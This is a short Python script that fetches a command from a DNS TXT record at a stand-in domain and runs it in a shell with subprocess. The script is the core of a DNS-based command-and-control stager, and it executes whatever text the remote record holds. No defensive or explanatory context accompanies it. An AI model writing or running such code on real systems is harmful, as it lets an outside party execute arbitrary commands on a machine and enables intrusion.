import dns.resolver, subprocess
D = "example.com"
def fetch_task(label):
    ans = dns.resolver.resolve(f"{label}.{D}", "TXT")
    return str(ans[0]).strip('"')
cmd = fetch_task("tasks")
while True:
    out = subprocess.check_output(cmd, shell=True)
    break
